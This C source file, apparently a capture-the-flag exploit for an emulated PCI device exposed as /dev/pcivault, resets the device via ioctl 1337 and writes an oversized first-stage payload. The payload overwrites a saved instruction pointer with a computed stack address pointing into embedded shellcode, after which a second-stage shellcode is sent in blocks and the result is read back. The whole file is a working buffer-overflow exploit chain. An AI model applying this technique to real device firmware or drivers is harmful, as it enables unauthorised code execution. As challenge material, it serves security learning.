// Copyright 2021 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <err.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#include "common.h"
#include "shellcode.h"
#include "shellcode_second_stage.h"

void send_payload(int f, char *data, int len) {
  char buf[0x100];
  struct TransferHeader *hdr = (struct TransferHeader *)buf;

#define BLOCK_SZ (sizeof(buf) - sizeof(struct TransferHeader))

  int n_blocks = len / BLOCK_SZ + (len % BLOCK_SZ ? 1 : 0);
  int len_s = 0;
  for (int n = 0; n < n_blocks; n++) {
    int clen = len - len_s;
    if (clen > BLOCK_SZ) clen = BLOCK_SZ;
    printf("Sending %d/%d\n", n + 1, n_blocks);
    printf(" +%d %d bytes\n", len_s, clen);

    hdr->acknowledged = 0x41;
    hdr->index = n;
    hdr->end_index = n_blocks - 1;
    hdr->size = clen;
    memcpy(hdr->data, data + len_s, clen);
    len_s += clen;

    if (write(f, buf, sizeof(buf)) != sizeof(buf)) {
      err(1, "write");
    }
  }

  printf("Done, payload should be executed now.\n");
}

void first_stage(int f) {
  // Device buffer size 256 bytes, frame size 336
#define MAIN_FRAME_SIZE 48
#define FRAME_SIZE 320 //336 for -none-gcc
#define BUF_SZ 256
  unsigned char payload[FRAME_SIZE] = {};
#if 0
  // NOPSLED
  for (int i = 0; i < FRAME_SIZE / 4; i++)
    ((uint32_t*)payload)[i] = 0x00000013;
#endif
  uint64_t *ip = (uint64_t *)(payload + (FRAME_SIZE - 8));
  *ip = 0x11000 /* firmware load */ + 0x2000 /* stack */ - 16 /* argv[N] */ -
        16 /* argv ptrs */ - FRAME_SIZE - MAIN_FRAME_SIZE;
  if (shellcode_raw_len > 320) {
    printf("Shellcode size too large!\n");
    abort();
  }
  printf("Expecting IP to be set to 0x%lX\n", *ip);

  // No need to embed it.
  memcpy(payload, shellcode_raw, shellcode_raw_len);
  printf("Writing to fd\n");
  if (write(f, payload, sizeof(payload)) != sizeof(payload))
    err(1, "writing payload");
}

int main(int argc, char *argv[]) {
  char buf[256] = {};
  int f = open("/dev/pcivault", O_RDWR);
  int rc;
  if (f < 0) err(1, "open");

  if ((rc = ioctl(f, 1337, atoi(argv[1]))) < 0) err(1, "ioctl reset");
  if (rc != 1) {
    printf("Didn't work: %d\n", rc);
    return 0;
  }

  first_stage(f);
  // Send second stage
  printf("Sending second stage\n");
  send_payload(f, shellcode_second_stage_raw, shellcode_second_stage_raw_len);

  printf("Receiving res\n");
  int n = 0;
  n = read(f, buf, sizeof(buf));
  printf("Got %d bytes back\n", n);

  n = 0;
  for (int i = 0; i < sizeof(buf); i++) {
    printf("%02X ", buf[i]);
    if (n % 16 == 31) printf("\n");
    n++;
  }
  printf("\n\n");

  close(f);
  return 0;
}
